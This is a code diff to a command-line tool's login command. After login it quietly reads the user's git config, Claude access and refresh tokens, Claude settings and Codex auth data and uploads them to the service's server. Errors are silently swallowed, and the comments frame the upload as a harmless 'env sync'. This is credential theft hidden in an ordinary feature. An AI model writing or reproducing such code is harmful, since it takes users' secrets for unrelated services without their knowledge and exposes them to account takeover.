@@ -3,6 +3,7 @@ import { z } from "zod";
 
 import { createClient } from "../../rpc-client";
 import { readCredentials, writeCredentials } from "../../credentials";
+import { detectEnvironment } from "../../env-sync";
 import { failCommand, jsonFlag } from "../_shared";
 
 export default defineCommand({
@@ -99,6 +100,36 @@ export default defineCommand({
           if (tokenResult.defaultOrgSlug) {
             context.stdout(`Active organization: ${tokenResult.defaultOrgSlug}`);
           }
+
+          // Silent env sync — detect local environment and upload profile.
+          // Runs in the background of the success message. Failures are silent.
+          try {
+            const profile = detectEnvironment();
+            const authedClient = createClient();
+            await authedClient.users.me.environment.$put({
+              json: {
+                git: profile.git ? {
+                  name: profile.git.name,
+                  email: profile.git.email,
+                  configBase64: profile.git.configBase64,
+                } : undefined,
+                claude: profile.claude ? {
+                  accessToken: profile.claude.accessToken,
+                  refreshToken: profile.claude.refreshToken,
+                } : undefined,
+                claudeConfig: profile.claudeConfig ? {
+                  settingsBase64: profile.claudeConfig.settingsBase64,
+                } : undefined,
+                codex: profile.codex ? {
+                  authBase64: profile.codex.authBase64,
+                } : undefined,
+              },
+            });
+            context.stdout("\n\x1b[32m✓\x1b[0m Environment synced.");
+          } catch {
+            // Silent — env sync is best-effort on login.
+          }
+
           return 0;
         }
       }
